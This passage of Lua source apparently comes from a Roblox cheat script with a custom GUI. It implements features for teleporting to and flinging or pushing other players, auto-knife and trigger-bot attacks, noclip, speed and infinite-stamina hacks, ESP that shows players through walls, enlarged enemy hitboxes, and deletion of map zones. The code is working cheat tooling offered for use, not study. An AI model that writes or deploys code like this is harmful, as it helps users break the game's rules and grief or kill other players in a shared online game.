                local hoverBg   = Color3.new(
                    math.clamp(def[2].R + 0.08, 0, 1),
                    math.clamp(def[2].G + 0.08, 0, 1),
                    math.clamp(def[2].B + 0.08, 0, 1))
                b.MouseEnter:Connect(function()  b.BackgroundColor3 = hoverBg   end)
                b.MouseLeave:Connect(function()  b.BackgroundColor3 = defaultBg end)
                if def[4] then
                    b.MouseButton1Click:Connect(function() pcall(def[4]) end)
                end
                btns[i]._btn = b  -- store ref so callbacks can be wired below
            end
        end

        local btnY1 = infoY + BTN_GAP
        local btnY2 = btnY1 + BTN_H + BTN_GAP

        makeButtonRow(row1, btnY1)
        makeButtonRow(row2, btnY2)

        -- ── wire callbacks now that buttons exist ─────────────────
        -- GoTo
        row1[1]._btn.MouseButton1Click:Connect(function()
            local myHRP = getHRP()
            if myHRP and p2.Character and p2.Character:FindFirstChild("HumanoidRootPart") then
                myHRP.CFrame = p2.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,4)
            end
        end)

        -- Spec
        row1[2]._btn.MouseButton1Click:Connect(function()
            if spectateTarget == p2 then
                stopSpectate()
            else
                if spectateTarget then stopSpectate() end
                spectateTarget = p2
                local tHum = p2.Character and p2.Character:FindFirstChildOfClass("Humanoid")
                if tHum then Camera.CameraType = Enum.CameraType.Custom; Camera.CameraSubject = tHum end
            end
        end)

        -- Push
        row1[3]._btn.MouseButton1Click:Connect(function()
            task.spawn(function()
                local targetChar = p2.Character
                if not targetChar then return end
                local tHRP2 = targetChar:FindFirstChild("HumanoidRootPart")
                if not tHRP2 then return end
                local myHRP  = getHRP()
                local myChar = LocalPlayer.Character
                if not myHRP or not myChar then return end
                local function findMyPush()
                    for _, item in ipairs(myChar:GetChildren()) do
                        if item:IsA("Tool") and PUSH_ITEMS[item.Name] then return item end
                    end
                    local bp = LocalPlayer:FindFirstChildOfClass("Backpack")
                    if bp then
                        for _, item in ipairs(bp:GetChildren()) do
                            if item:IsA("Tool") and PUSH_ITEMS[item.Name] then return item end
                        end
                    end
                end
                local pushTool = findMyPush()
                if not pushTool then
                    game:GetService("StarterGui"):SetCore("SendNotification",
                        {Title="Push", Text="No push item in inventory.", Duration=3})
                    return
                end
                local returnCF  = myHRP.CFrame
                local UP_ANGLE  = math.rad(75)
                local behindPos = tHRP2.CFrame.Position + tHRP2.CFrame.LookVector * 1.5 + Vector3.new(0, 0.5, 0)
                local lookDir   = (tHRP2.CFrame.LookVector + Vector3.new(0, math.tan(UP_ANGLE), 0)).Unit
                myHRP.CFrame    = CFrame.new(behindPos, behindPos + lookDir)
                task.wait(0.05)
                pcall(function()
                    local hum2 = myChar:FindFirstChildOfClass("Humanoid")
                    if hum2 then pushTool.Parent = myChar; task.wait(0.03); hum2:EquipTool(pushTool) end
                end)
                task.wait(0.06)
                local fired = false
                for _, re in ipairs(pushTool:GetDescendants()) do
                    if re:IsA("RemoteEvent") then re:FireServer(); fired = true; break end
                end
                if not fired then
                    -- VirtualUser fallback: briefly set scriptable camera just to aim the click
                    local savedCamType = Camera.CameraType
                    local savedCamCF   = Camera.CFrame
                    local savedSubject = Camera.CameraSubject
                    Camera.CameraType  = Enum.CameraType.Scriptable
                    Camera.CFrame      = CFrame.new(behindPos, behindPos + lookDir)
                    local vu  = game:GetService("VirtualUser")
                    local mid = Vector2.new(Camera.ViewportSize.X/2, Camera.ViewportSize.Y/2)
                    pcall(function() vu:Button1Down(mid, Camera.CFrame) end)
                    task.wait(0.08)
                    pcall(function() vu:Button1Up(mid, Camera.CFrame) end)
                    Camera.CameraType    = savedCamType
                    Camera.CFrame        = savedCamCF
                    Camera.CameraSubject = savedSubject
                end
                task.wait(0.12)
                myHRP.CFrame = returnCF
            end)
        end)

        -- Fling
        row1[4]._btn.MouseButton1Click:Connect(function()
            local p3 = p2
            task.spawn(function() if p3 and p3.Character then SkidFling(p3) end end)
        end)

        -- Pipe Hit
        row2[1]._btn.MouseButton1Click:Connect(function()
            local p4 = p2; task.spawn(function() doPipeHit(p4) end)
        end)

        -- Spray
        row2[2]._btn.MouseButton1Click:Connect(function()
            cfg.PepperEnabled = not cfg.PepperEnabled
            if cfg.PepperEnabled then startPepperAuto(p2) else stopPepperAuto() end
        end)

        -- ══════════════════════════════════════════════════════════
        -- WARN LABEL
        -- ══════════════════════════════════════════════════════════
        local warnY = btnY2 + BTN_H + BTN_GAP
        local warnLbl = Instance.new("TextLabel", panel)
        warnLbl.Size             = UDim2.new(1, -PAD*2, 0, WARN_H)
        warnLbl.Position         = UDim2.fromOffset(PAD, warnY)
        warnLbl.BackgroundColor3 = Color3.fromRGB(28, 16, 46)
        warnLbl.BorderSizePixel  = 0
        warnLbl.TextColor3       = Color3.fromRGB(180, 140, 240)
        warnLbl.Font             = Enum.Font.Gotham
        warnLbl.TextSize         = 10
        warnLbl.TextWrapped      = true
        warnLbl.Text             = "⚠  Push works best on elevated targets away from map edges — can be a server-side kill."
        warnLbl.TextXAlignment   = Enum.TextXAlignment.Left
        warnLbl.TextYAlignment   = Enum.TextYAlignment.Center
        warnLbl.BorderSizePixel  = 0
        UILib.addCorner(warnLbl, 5)
        local warnPad = Instance.new("UIPadding", warnLbl)
        warnPad.PaddingLeft = UDim.new(0,8); warnPad.PaddingRight = UDim.new(0,8)

        -- ── fade in ───────────────────────────────────────────────
        task.spawn(function()
            local steps = 20
            local dur   = 0.18
            for s = 1, steps do
                task.wait(dur / steps)
                if panel and panel.Parent then
                    local t = 1 - (s / steps)
                    panel.GroupTransparency = t
                    if panelStroke then panelStroke.Transparency = t * 0.35 end
                end
            end
            if panel and panel.Parent then
                panel.GroupTransparency = 0
                if panelStroke then panelStroke.Transparency = 0.35 end
            end
        end)
    end


    -- ════════════════════════════════════════════════════════════
    -- END OF VIEWER TAB FUNCTIONS
    -- ════════════════════════════════════════════════════════════

    
    -- ════════════════════════════════════════════════════════════
    -- SETTINGS TAB FUNCTIONS
    -- ════════════════════════════════════════════════════════════

    -- ── Green UI Recolor ─────────────────────────────────────────
    local recolorData = {}
    local OUR_GUI_NAME = "Massacreme_UILib"
    local GREEN_THEME = {
        accent     = Color3.fromRGB(0, 220, 100),
        accentDim  = Color3.fromRGB(0, 160, 70),
        accentDark = Color3.fromRGB(0, 80,  35),
        text       = Color3.fromRGB(200, 255, 220),
        muted      = Color3.fromRGB(100, 180, 130),
        bg         = Color3.fromRGB(8,   20,  12),
        bg2        = Color3.fromRGB(12,  28,  18),
        stroke     = Color3.fromRGB(0,   80,  40),
    }
    local function mapToGreen(orig)
        local r, g, b = orig.R, orig.G, orig.B
        local brightness = (r + g + b) / 3
        if brightness > 0.85 then return GREEN_THEME.text end
        if brightness < 0.12 then return GREEN_THEME.bg   end
        if brightness < 0.22 then return GREEN_THEME.bg2  end
        if r > g * 1.5 and r > b * 1.5 then
            return brightness > 0.5 and GREEN_THEME.accent or GREEN_THEME.accentDim
        end
        if g > r * 1.2 and g > b * 1.2 then return GREEN_THEME.accent end
        if b > r * 1.2 or (b > 0.3 and brightness < 0.4) then
            return brightness < 0.25 and GREEN_THEME.bg2 or GREEN_THEME.accentDark
        end
        if math.abs(r - g) < 0.08 and math.abs(g - b) < 0.08 then
            return brightness > 0.6 and GREEN_THEME.muted or GREEN_THEME.stroke
        end
        return brightness > 0.5 and GREEN_THEME.muted or GREEN_THEME.bg2
    end
    local function saveAndSet(inst, prop, newVal)
        if not recolorData[inst] then recolorData[inst] = {} end
        if recolorData[inst][prop] == nil then recolorData[inst][prop] = inst[prop] end
        pcall(function() inst[prop] = newVal end)
    end
    local function recolorInstance(inst)
        if inst:IsA("Frame") or inst:IsA("ScrollingFrame") or inst:IsA("CanvasGroup") then
            if inst.BackgroundTransparency < 0.95 then saveAndSet(inst, "BackgroundColor3", mapToGreen(inst.BackgroundColor3)) end
        end
        if inst:IsA("TextLabel") or inst:IsA("TextButton") or inst:IsA("TextBox") then
            if inst.BackgroundTransparency < 0.95 then saveAndSet(inst, "BackgroundColor3", mapToGreen(inst.BackgroundColor3)) end
            saveAndSet(inst, "TextColor3", mapToGreen(inst.TextColor3))
        end
        if inst:IsA("ImageLabel") or inst:IsA("ImageButton") then
            if inst.BackgroundTransparency < 0.95 then saveAndSet(inst, "BackgroundColor3", mapToGreen(inst.BackgroundColor3)) end
            saveAndSet(inst, "ImageColor3", mapToGreen(inst.ImageColor3))
        end
        if inst:IsA("UIStroke") then saveAndSet(inst, "Color", mapToGreen(inst.Color)) end
        if inst:IsA("UIGradient") then
            saveAndSet(inst, "Color", ColorSequence.new({
                ColorSequenceKeypoint.new(0, GREEN_THEME.accentDim),
                ColorSequenceKeypoint.new(1, GREEN_THEME.accentDark),
            }))
        end
    end
    local function _aGR()
        recolorData = {}
        for _, gui in ipairs(PlayerGui:GetChildren()) do
            if gui.Name == OUR_GUI_NAME then continue end
            if not gui:IsA("ScreenGui") then continue end
            for _, desc in ipairs(gui:GetDescendants()) do pcall(function() recolorInstance(desc) end) end
            for _, child in ipairs(gui:GetChildren()) do pcall(function() recolorInstance(child) end) end
        end
    end
    local function _rGR()
        for inst, props in pairs(recolorData) do
            for prop, val in pairs(props) do pcall(function() inst[prop] = val end) end
        end
        recolorData = {}
    end

    -- ── Anti AFK ──────────────────────────────────────────────────
    local antiAFKConn = nil
    local function stopAntiAFK()
        if antiAFKConn then antiAFKConn:Disconnect(); antiAFKConn = nil end
    end
    local function startAntiAFK()
        stopAntiAFK()
        antiAFKConn = LocalPlayer.Idled:Connect(function()
            VirtualUser:Button2Down(Vector2.new(0,0), Camera.CFrame)
            task.wait(0.1)
            VirtualUser:Button2Up(Vector2.new(0,0), Camera.CFrame)
        end)
    end

    -- ── Fullbright ────────────────────────────────────────────────
    local _fbOriginals = nil
    local function stopFullbright()
        if _AUTO.fullbrightConn then _AUTO.fullbrightConn:Disconnect(); _AUTO.fullbrightConn = nil end
        if _AUTO.fullbrightChildConn then _AUTO.fullbrightChildConn:Disconnect(); _AUTO.fullbrightChildConn = nil end
        if _AUTO.fullbrightMapConn then _AUTO.fullbrightMapConn:Disconnect(); _AUTO.fullbrightMapConn = nil end
        if _fbOriginals then
            local L = game:GetService("Lighting")
            pcall(function()
                L.Ambient        = _fbOriginals.Ambient
                L.OutdoorAmbient = _fbOriginals.OutdoorAmbient
                L.Brightness     = _fbOriginals.Brightness
                L.ClockTime      = _fbOriginals.ClockTime
            end)
            _fbOriginals = nil
        end
    end
    local function startFullbright()
        stopFullbright()
        local L = game:GetService("Lighting")
        -- save originals
        _fbOriginals = {
            Ambient        = L.Ambient,
            OutdoorAmbient = L.OutdoorAmbient,
            Brightness     = L.Brightness,
            ClockTime      = L.ClockTime,
        }
        -- apply fullbright — do NOT touch or destroy any Lighting children,
        -- LightingManager owns them and crashes if they're removed mid-render
        local function applyFB()
            pcall(function()
                L.Ambient        = Color3.new(1, 1, 1)
                L.OutdoorAmbient = Color3.new(1, 1, 1)
                L.Brightness     = 2
                L.ClockTime      = 14
            end)
        end
        applyFB()
        -- Re-apply when LightingManager resets our values, with debounce
        local _fbSetting = false
        _AUTO.fullbrightConn = L:GetPropertyChangedSignal("Ambient"):Connect(function()
            if not cfg.FullbrightEnabled then return end
            if _fbSetting then return end
            if L.Ambient == Color3.new(1, 1, 1) then return end
            _fbSetting = true
            task.defer(function()
                applyFB()
                _fbSetting = false
            end)
        end)
    end

    -- ── Delete Zones ──────────────────────────────────────────────
    local function _initDeleteZones()
        local function deleteZones(mapMap)
            if not mapMap then return end
            local z = mapMap:FindFirstChild("Zones")
            if z then pcall(function() z:Destroy() end) end
            mapMap.ChildAdded:Connect(function(child)
                if child.Name == "Zones" then
                    task.wait(0.1)
                    if cfg.DeleteZonesEnabled then pcall(function() child:Destroy() end) end
                end
            end)
        end
        local function hookMap()
            local map1 = workspace:FindFirstChild("Map")
            if not map1 then return end
            local map2 = map1:FindFirstChild("Map")
            if map2 then deleteZones(map2) end
            map1.ChildAdded:Connect(function(child)
                if child.Name == "Map" then task.wait(0.5); if cfg.DeleteZonesEnabled then deleteZones(child) end end
            end)
        end
        hookMap()
        workspace.ChildAdded:Connect(function(child)
            if child.Name == "Map" then task.wait(0.5); hookMap() end
        end)
    end

    -- ── Target Info HUD ───────────────────────────────────────────
    local function _initTargetHUD()
        local UIS2 = game:GetService("UserInputService")
        local RS2  = game:GetService("RunService")

        local function getTargetUnderCrosshair()
            local cam = Camera
            if not cam then return nil end
            local mid = Vector2.new(cam.ViewportSize.X / 2, cam.ViewportSize.Y / 2)
            local ray = cam:ScreenPointToRay(mid.X, mid.Y)
            local params = RaycastParams.new()
            params.FilterType = Enum.RaycastFilterType.Exclude
            local myChar = LocalPlayer.Character
            params.FilterDescendantsInstances = myChar and {myChar} or {}
            local result = workspace:Raycast(ray.Origin, ray.Direction * 600, params)
            if not result then return nil end
            local part = result.Instance
            local char = part and part.Parent
            local plr  = char and Players:GetPlayerFromCharacter(char)
            if not plr then char = char and char.Parent; plr = char and Players:GetPlayerFromCharacter(char) end
            return plr
        end
        local function getEquippedTool(plr)
            if not plr or not plr.Character then return "—" end
            for _, v in ipairs(plr.Character:GetChildren()) do
                if v:IsA("Tool") then return v.Name end
            end
            return "—"
        end
        local function getPlayerLevel(plr)
            local ls = plr:FindFirstChild("leaderstats")
            if ls then
                for _, v in ipairs(ls:GetChildren()) do
                    local n = v.Name:lower()
                    if n == "level" or n == "lvl" or n == "rank" or n == "xp" or n == "prestige" then return tostring(v.Value) end
                end
                for _, v in ipairs(ls:GetChildren()) do
                    if v:IsA("IntValue") or v:IsA("NumberValue") then return tostring(math.floor(v.Value)) end
                end
            end
            for _, v in ipairs(plr:GetChildren()) do
                local n = v.Name:lower()
                if (n == "level" or n == "lvl" or n == "rank") and (v:IsA("IntValue") or v:IsA("NumberValue")) then return tostring(v.Value) end
            end
            return nil
        end

        local tGui = Instance.new("ScreenGui")
        tGui.Name           = "MP_TargetHUD"
        tGui.ResetOnSpawn   = false
        tGui.IgnoreGuiInset = true
        tGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        tGui.DisplayOrder   = 50
        pcall(function() tGui.Parent = game:GetService("CoreGui") end)
        if not tGui.Parent then tGui.Parent = PlayerGui end

        -- On mobile: anchor below the quickbar (follows bar drag left/right).
        -- On PC: default offset from screen center.
        local function _hudDefaultOffsets()
            if _isMobile and _qbContainerRef then
                local vp  = Camera and Camera.ViewportSize or Vector2.new(1280, 720)
                local qbAbs = _qbContainerRef.AbsolutePosition
                local qbSz  = _qbContainerRef.AbsoluteSize
                -- X: center under the bar; Y: below it with a comfortable gap
                return qbAbs.X + qbSz.X / 2 - 134, qbAbs.Y + qbSz.Y + 20
            end
            return -140, 72
        end
        local _dX, _dY = _hudDefaultOffsets()
        local dOffX, dOffY = _dX, _dY
        local panel = Instance.new("Frame", tGui)
        panel.Size                  = UDim2.fromOffset(268, 68)
        panel.BackgroundColor3      = Color3.fromRGB(10, 11, 18)
        panel.BackgroundTransparency = 0.08
        panel.BorderSizePixel       = 0
        panel.Visible               = false
        Instance.new("UICorner", panel).CornerRadius = UDim.new(0, 10)
        local panelStroke = Instance.new("UIStroke", panel)
        panelStroke.Thickness = 1; panelStroke.Transparency = 0.5
        panelStroke.Color = Color3.fromRGB(0, 200, 90)

        local function repos()
            local vp = Camera and Camera.ViewportSize or Vector2.new(1280, 720)
            if _isMobile and _qbContainerRef then
                -- Recalculate X from bar position each time so it follows drags
                local qbAbs = _qbContainerRef.AbsolutePosition
                local qbSz  = _qbContainerRef.AbsoluteSize
                local hx = math.clamp(math.floor(qbAbs.X + qbSz.X / 2 - 134), 4, vp.X - 272)
                local hy = math.clamp(math.floor(qbAbs.Y + qbSz.Y + 20), 4, vp.Y - 72)
                panel.Position = UDim2.fromOffset(hx, hy)
            else
                panel.Position = UDim2.fromOffset(
                    math.clamp(math.floor(vp.X/2 + dOffX), 4, vp.X - 272),
                    math.clamp(dOffY, 4, vp.Y - 72))
            end
        end
        repos()

        local accent = Instance.new("Frame", panel)
        accent.Size = UDim2.fromOffset(3, 52); accent.Position = UDim2.fromOffset(7, 8)
        accent.BorderSizePixel = 0; accent.BackgroundColor3 = Color3.fromRGB(0, 200, 90)
        Instance.new("UICorner", accent).CornerRadius = UDim.new(0, 2)

        local nameRow = Instance.new("Frame", panel)
        nameRow.Size = UDim2.new(1, -20, 0, 20); nameRow.Position = UDim2.fromOffset(16, 6)
        nameRow.BackgroundTransparency = 1; nameRow.BorderSizePixel = 0
        local nameLblT = Instance.new("TextLabel", nameRow)
        nameLblT.Size = UDim2.new(1, -50, 1, 0); nameLblT.BackgroundTransparency = 1
        nameLblT.Font = Enum.Font.GothamBold; nameLblT.TextSize = 13
        nameLblT.TextColor3 = Color3.fromRGB(235, 240, 255); nameLblT.TextXAlignment = Enum.TextXAlignment.Left
        nameLblT.Text = ""; nameLblT.BorderSizePixel = 0
        local lvlLbl = Instance.new("TextLabel", nameRow)
        lvlLbl.Size = UDim2.fromOffset(48, 20); lvlLbl.Position = UDim2.new(1, -48, 0, 0)
        lvlLbl.BackgroundTransparency = 1; lvlLbl.Font = Enum.Font.Gotham; lvlLbl.TextSize = 10
        lvlLbl.TextColor3 = Color3.fromRGB(110, 120, 150); lvlLbl.TextXAlignment = Enum.TextXAlignment.Right
        lvlLbl.Text = ""; lvlLbl.BorderSizePixel = 0

        local hpTrackT = Instance.new("Frame", panel)
        hpTrackT.Size = UDim2.new(1, -20, 0, 5); hpTrackT.Position = UDim2.fromOffset(16, 30)
        hpTrackT.BackgroundColor3 = Color3.fromRGB(30, 33, 48); hpTrackT.BorderSizePixel = 0
        Instance.new("UICorner", hpTrackT).CornerRadius = UDim.new(0, 3)
        local hpFillT = Instance.new("Frame", hpTrackT)
        hpFillT.Size = UDim2.new(1, 0, 1, 0); hpFillT.BackgroundColor3 = Color3.fromRGB(0, 200, 90)
        hpFillT.BorderSizePixel = 0; Instance.new("UICorner", hpFillT).CornerRadius = UDim.new(0, 3)
        local hpLblT = Instance.new("TextLabel", panel)
        hpLblT.Size = UDim2.new(1, -20, 0, 14); hpLblT.Position = UDim2.fromOffset(16, 38)
        hpLblT.BackgroundTransparency = 1; hpLblT.Font = Enum.Font.Gotham; hpLblT.TextSize = 10
        hpLblT.TextColor3 = Color3.fromRGB(110, 120, 150); hpLblT.TextXAlignment = Enum.TextXAlignment.Left
        hpLblT.Text = ""; hpLblT.BorderSizePixel = 0
        local toolLbl = Instance.new("TextLabel", panel)
        toolLbl.Size = UDim2.fromOffset(90, 60); toolLbl.Position = UDim2.new(1, -96, 0, 0)
        toolLbl.BackgroundTransparency = 1; toolLbl.Font = Enum.Font.GothamSemibold; toolLbl.TextSize = 10
        toolLbl.TextColor3 = Color3.fromRGB(0, 200, 90); toolLbl.TextXAlignment = Enum.TextXAlignment.Right
        toolLbl.TextYAlignment = Enum.TextYAlignment.Center; toolLbl.TextWrapped = true
        toolLbl.Text = ""; toolLbl.BorderSizePixel = 0

        -- drag
        local draggingT, dragStartT, posStartT = false, nil, nil
        panel.InputBegan:Connect(function(inp)
            if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
                draggingT = true; dragStartT = inp.Position; posStartT = Vector2.new(dOffX, dOffY)
            end
        end)
        UIS2.InputChanged:Connect(function(inp)
            if not draggingT then return end
            if inp.UserInputType == Enum.UserInputType.MouseMovement or inp.UserInputType == Enum.UserInputType.Touch then
                local d = inp.Position - dragStartT
                local vp = Camera and Camera.ViewportSize or Vector2.new(1280, 720)
                dOffX = math.clamp(posStartT.X + d.X, -vp.X/2 + 10, vp.X/2 - 258)
                dOffY = math.clamp(posStartT.Y + d.Y, 4, vp.Y - 72)
                repos()
            end
        end)
        UIS2.InputEnded:Connect(function(inp)
            if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then draggingT = false end
        end)

        -- update loop
        local _tTimer = 0
        RS2.Heartbeat:Connect(function(dt)
            _tTimer = _tTimer + dt
            if _tTimer < 0.1 then return end
            _tTimer = 0
            if not cfg.TargetHUDEnabled then panel.Visible = false; return end
            local ok, plr = pcall(getTargetUnderCrosshair)
            plr = ok and plr or nil
            if not plr or plr == LocalPlayer then panel.Visible = false; return end
            local char = plr.Character
            if not char then panel.Visible = false; return end
            local hum = char:FindFirstChildOfClass("Humanoid")
            if not hum then panel.Visible = false; return end
            repos(); panel.Visible = true
            nameLblT.Text = plr.Name
            local lvl = getPlayerLevel(plr)
            lvlLbl.Text = lvl and ("Lv " .. lvl) or ""
            local hp    = math.max(0, math.floor(hum.Health))
            local maxHp = hum.MaxHealth > 0 and math.floor(hum.MaxHealth) or 100
            local pct   = math.clamp(hp / maxHp, 0, 1)
            hpFillT.Size = UDim2.new(pct, 0, 1, 0)
            hpFillT.BackgroundColor3 = Color3.fromRGB(math.floor((1-pct)*220), math.floor(pct*180+40), 40)
            hpLblT.Text = hp .. " / " .. maxHp .. " HP"
            toolLbl.Text = getEquippedTool(plr)
            local col = isPlayerOnKillerTeam(plr) and Color3.fromRGB(220,55,55) or Color3.fromRGB(0,200,90)
            accent.BackgroundColor3 = col; toolLbl.TextColor3 = col; panelStroke.Color = col
        end)
    end

    -- ════════════════════════════════════════════════════════════
    -- END OF SETTINGS TAB FUNCTIONS
    -- ════════════════════════════════════════════════════════════


    -- ════════════════════════════════════════════════════════════
    -- TAB: PLAYER
    -- ════════════════════════════════════════════════════════════
    local function renderPlayer()
        UILib.clearContent()
        UILib.sectionLabel("Movement")

        UILib.createSlider("CFrame Speed", 10, 250, cfg.Speed, 0, function(v)
            cfg.Speed = v
        end)
        local speedRow = UILib.keybindToggleRow("Speed Toggle", "SpeedToggle", "SpeedEnabled", function()
            -- speed runs via Heartbeat above, toggled by cfg.SpeedEnabled
        end)
        syncFns.SpeedEnabled = speedRow.SyncToggle

        local noclipRow = UILib.keybindToggleRow("Noclip Toggle", "NoclipToggle", "NoclipEnabled", function()
            _aNS()
        end)
        syncFns.NoclipEnabled = noclipRow.SyncToggle

        UILib.createToggle("Infinite Jump", cfg.InfiniteJumpEnabled, function(v)
            cfg.InfiniteJumpEnabled = v
        end)
        UILib.createToggle("No Jump Cooldown", cfg.NoJumpCD, function(v)
            cfg.NoJumpCD = v
        end, "Hold Space to jump repeatedly with no cooldown.")

        UILib.sectionLabel("Stamina")
        UILib.createToggle("Infinite Stamina", cfg.InfiniteStamina, function(v)
            cfg.InfiniteStamina = v
            if v then _sIS() else _xIS() end
        end, "Hold Shift to sprint at slider speed with no stamina drain.")
        UILib.createSlider("Sprint Speed", 10, 60, cfg.SprintSpeed, 0, function(v)
            cfg.SprintSpeed = v
            if cfg.InfiniteStamina then
                local ch  = LocalPlayer.Character
                local hum = ch and ch:FindFirstChildOfClass("Humanoid")
                if hum then pcall(function() hum.WalkSpeed = v end) end
                if staminaTrack then pcall(function() staminaTrack:AdjustSpeed(v/20) end) end
            end
        end)

        UILib.sectionLabel("Auto Knife")
        local knifeToggle = UILib.createToggle("Auto Knife Attack", cfg.KnifeEnabled, function(v)
            cfg.KnifeEnabled = v
            if v then _sKA() else _xKA() end
        end, "Teleports beside the killer and swings the knife automatically.")
        syncFns.KnifeEnabled = knifeToggle.Sync
        local biteToggle = UILib.createToggle("Auto Bite Attack", cfg.BiteEnabled, function(v)
            cfg.BiteEnabled = v
            if v then _sBiteA() else _xBiteA() end
        end, "Zombie mode: auto-equips BITE and attacks the nearest armed survivor. Uses the same offsets and rate as Auto Knife.")
        syncFns.BiteEnabled = biteToggle.Sync
        UILib.createToggle("Knife Survivors (grind kills)", KNIFE.TARGET_SURVIVORS, function(v)
            KNIFE.TARGET_SURVIVORS = v
            if cfg.KnifeEnabled then _xKA(); _sKA() end
        end, "When ON: targets survivors instead of killers.")
        UILib.createSlider("Swing Rate (s)", 0.2, 2.0, KNIFE.RATE, 2, function(v)
            KNIFE.RATE = v
        end)
        UILib.createSlider("Attack when killer HP below (%)", 1, 100, KNIFE.ENGAGE_HP, 0, function(v)
            KNIFE.ENGAGE_HP = v
        end)
        UILib.createSlider("Side Offset (studs)", 0.0, 8.0, KNIFE.SIDE_OFF, 1, function(v)
            KNIFE.SIDE_OFF = v
        end)
        UILib.createSlider("Vertical Offset (studs)", 0.0, 6.0, KNIFE.VERT_OFF, 1, function(v)
            KNIFE.VERT_OFF = v
        end)
        UILib.createSlider("Back Offset (studs)", -5.0, 5.0, KNIFE.BACK_OFF, 1, function(v)
            KNIFE.BACK_OFF = v
        end)
        UILib.sectionLabel("Auto Bandage")
        local bandageToggle = UILib.createToggle("Auto Bandage", cfg.AutoBandageEnabled, function(v)
            cfg.AutoBandageEnabled = v
            if v then startAutoBandage() else stopAutoBandage() end
        end, "Fires the Bandage Use remote when HP drops below threshold.")
        syncFns.AutoBandageEnabled = bandageToggle.Sync
        UILib.createSlider("Bandage Below HP", 10, 100, _AUTO.BANDAGE_HP, 0, function(v)
            _AUTO.BANDAGE_HP = v
        end)

        UILib.sectionLabel("Auto Flashbang")
        local flashToggle = UILib.createToggle("Auto Flashbang", cfg.AutoFlashEnabled, function(v)
            cfg.AutoFlashEnabled = v
            if v then startAutoFlash() else stopAutoFlash() end
        end, "Automatically throws a flashbang when a killer gets within range.")
        syncFns.AutoFlashEnabled = flashToggle.Sync
        UILib.createSlider("Flash Range (studs)", 5, 80, _AUTO.FLASH_RANGE, 0, function(v)
            _AUTO.FLASH_RANGE = v
        end)
        UILib.createToggle("Anti-Flashbang", cfg.DisableFlashEnabled, function(v)
            cfg.DisableFlashEnabled = v
            applyDisableFlash(v)
        end, "Removes the flash/blind effect on YOUR screen.")

        UILib.sectionLabel("Trigger Bot")
        local triggerToggle = UILib.createToggle("Trigger Bot", cfg.TriggerBotEnabled, function(v)
            cfg.TriggerBotEnabled = v
        end, "Auto-clicks when your crosshair is over a player with a Humanoid.")
        syncFns.TriggerBotEnabled = triggerToggle.Sync
        UILib.createToggle("Team Check", cfg.TB_TeamCheck, function(v)
            cfg.TB_TeamCheck = v
        end, "Skip firing when the target is on your team.")
        UILib.keybindRow("Trigger Toggle", "TriggerToggle", function()
            cfg.TriggerBotEnabled = not cfg.TriggerBotEnabled
            if syncFns.TriggerBotEnabled then syncFns.TriggerBotEnabled(cfg.TriggerBotEnabled) end
        end)
        UILib.createSlider("Fire Interval (s)", 0.05, 1.0, _AUTO.TRIGGER_RATE, 2, function(v)
            _AUTO.TRIGGER_RATE = v
        end)

    end
    
    -- ════════════════════════════════════════════════════════════
    -- TAB: ESP
    -- ════════════════════════════════════════════════════════════
    local function renderESP()
        UILib.clearContent()
        UILib.sectionLabel("Player ESP")
        --SEE PLAYERS THROUGH WALLS
        local espToggle = UILib.createToggle("See Players Through Walls", cfg.ESPEnabled, function(v)
            cfg.ESPEnabled = v
        end)
        syncFns.ESPEnabled = espToggle.Sync
        --PLAYER HIGHLIGHT (CHAMS)
        UILib.createToggle("Player Highlight (Chams)", cfg.ESPChams, function(v)
            cfg.ESPChams = v
        end)
        --Player Outlines (2D BOXES)
        UILib.createToggle("Player Outlines", cfg.ESPOutlines, function(v)
            cfg.ESPOutlines = v
        end)
        --Player Labels
        UILib.createToggle("Player Labels", cfg.PlayerLabels, function(v)
            cfg.PlayerLabels = v
        end)
        UILib.createSlider("Player Labels Size", 9, 20, cfg.PlayerLabelSize, 0, function(v)
            cfg.PlayerLabelSize = v
        end)
        --TRACERS
        UILib.createToggle("Player Tracers", cfg.ESPTracers, function(v)
            cfg.ESPTracers = v
        end)

        UILib.sectionLabel("Item ESP")
        --ITEM ESP
        UILib.createToggle("Item ESP", cfg.ItemESPEnabled, function(v)
            cfg.ItemESPEnabled = v
        end, "Shows labels and tracers for all items in the map.")
        --ITEM CHAMS
        UILib.createToggle("Item Chams", cfg.ItemChamsEnabled, function(v)
            cfg.ItemChamsEnabled = v
        end, "Highlights item meshes through walls using a color overlay.")
        --ITEM ESP LABELS
        UILib.createToggle("Item Labels", cfg.ItemESPLabels, function(v)
            cfg.ItemESPLabels = v
        end)
        --ITEM ESP TRACERS
        UILib.createToggle("Item Tracers", cfg.ItemESPTracers, function(v)
            cfg.ItemESPTracers = v
        end)
        --BEAR TRAP ESP
        UILib.createToggle("Bear Trap ESP", cfg.BearTrapESP, function(v)
            cfg.BearTrapESP = v
            if v then
                for _, hl in pairs(_AUTO.bearTrapHighlights) do pcall(function() hl:Destroy() end) end
                _AUTO.bearTrapHighlights = {}
                scanTrapsOnce(workspace)
            end
            updateBearTrapESP()
        end, "Highlights bear traps through walls so you can easily spot and avoid them.")

        UILib.sectionLabel("Team Filters")
        --KILLER ESP ONLY
        UILib.createToggle("Killer ESP Only", cfg.KillerESPOnly, function(v)
            cfg.KillerESPOnly = v -- FUNCTION HERE
        end)
        --SHOW TEAMMATES
        UILib.createToggle("Show Teammates", cfg.ShowTeammates, function(v)
            cfg.ShowTeammates = v -- FUNCTION HERE
        end)

        UILib.sectionLabel("Hitbox")
        --EXPANDED ENEMY HITBOX
        UILib.createToggle("Expanded Enemy Hitbox", cfg.HitboxEnabled, function(v)
            cfg.HitboxEnabled = v -- FUNCTION HERE
        end)
        --HITBOX SIZE
        UILib.createSlider("Hitbox Size", 2, 20, cfg.HitboxSize, 1, function(v)
            cfg.HitboxSize = v -- FUNCTION HERE
        end)
        UILib.mutedText("Expands HumanoidRootPart on enemies. Makes them much easier to hit.")

        UILib.sectionLabel("ESP Colors")
        UILib.createColorRow("Killer Color",      cfg.ESPColorKiller,          function(c) cfg.ESPColorKiller         = c end)
        UILib.createColorRow("Survivor Color",    cfg.ESPColorSurvivor,        function(c) cfg.ESPColorSurvivor       = c end)
        UILib.createColorRow("Teammate Color",    cfg.ESPColorTeammate,        function(c) cfg.ESPColorTeammate       = c end)
